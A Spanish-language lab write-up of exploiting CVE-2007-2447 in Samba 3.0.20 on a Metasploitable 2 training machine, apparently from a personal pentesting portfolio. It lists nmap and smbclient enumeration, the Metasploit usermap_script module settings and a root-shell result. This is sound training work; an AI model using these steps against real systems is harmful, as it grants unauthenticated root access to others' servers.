ğŸ› ï¸ ExplotaciÃ³n de Samba 3.0.20 - CVE-2007-2447 (Metasploitable 2)

ğŸ¯ Objetivo

Explotar una vulnerabilidad en el servicio Samba 3.0.20 corriendo en Metasploitable 2 para obtener ejecuciÃ³n remota de comandos como root.Este fallo permite abusar del parÃ¡metro username map script y obtener una shell directamente.

ğŸ§  Detalles tÃ©cnicos

ğŸ“Œ Vulnerabilidad: CVE-2007-2447

ğŸ§¹ Servicio vulnerable: Samba 3.0.20-Debian

ğŸ“ Puerto: 445/TCP

ğŸ’½ IP del objetivo: 192.168.1.149

ğŸ¯ Nivel de acceso: ROOT âš¡

ğŸ” Escaneo de servicios

nmap -sV -sC -p 445 -Pn -oN samba_scan.txt 192.168.1.149


ğŸ“ EnumeraciÃ³n con smbclient

Antes de lanzar el exploit, revisamos los recursos compartidos de Samba:

smbclient -L //192.168.1.149 -U%


ğŸš€ ExplotaciÃ³n con Metasploit

1ï¸âƒ£ Iniciar Metasploit:

msfconsole

2ï¸âƒ£ Cargar el mÃ³dulo de Samba:

use exploit/multi/samba/usermap_script

3ï¸âƒ£ Configurar el exploit:

set RHOSTS 192.168.1.149
set RPORT 445
set payload cmd/unix/interact
run


ğŸ’¡ ComprobaciÃ³n de acceso

whoami
id
uname -a

Resultado Obtenido:

root
uid=0(root) gid=0(root)
Linux metasploitable 2.6.x ...

âœ… ConclusiÃ³n

Esta vulnerabilidad en Samba permite obtener una shell remota como root sin autenticaciÃ³n, abusando de cÃ³mo la aplicaciÃ³n maneja los mapas de nombres de usuario. Es un ejemplo clÃ¡sico de ejecuciÃ³n remota (RCE) ğŸ’¥.

ğŸ“ Evidencias

Ubicadas en:exploits/samba-usermap-cve2007-2447/evidencias/